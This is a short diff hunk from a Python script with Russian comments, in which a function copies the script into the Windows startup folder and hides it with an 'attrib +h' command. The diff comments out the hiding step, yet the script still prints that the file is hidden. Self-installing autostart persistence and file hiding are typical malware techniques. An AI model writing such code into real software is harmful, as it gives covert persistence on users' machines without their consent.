@@ -16,7 +16,7 @@ def copy_to_startup():
         print(f"[+] Скрипт успешно добавлен в автозагрузку: {destination_path}")
         
         # Скрываем
-        subprocess.run(f'attrib +h "{destination_path}"', shell=True)
+        #subprocess.run(f'attrib +h "{destination_path}"', shell=True)
         print(f"[+] Файл скрыт: {destination_path}")
     else:
         print(f"[!] Скрипт уже находится в автозагрузке.")
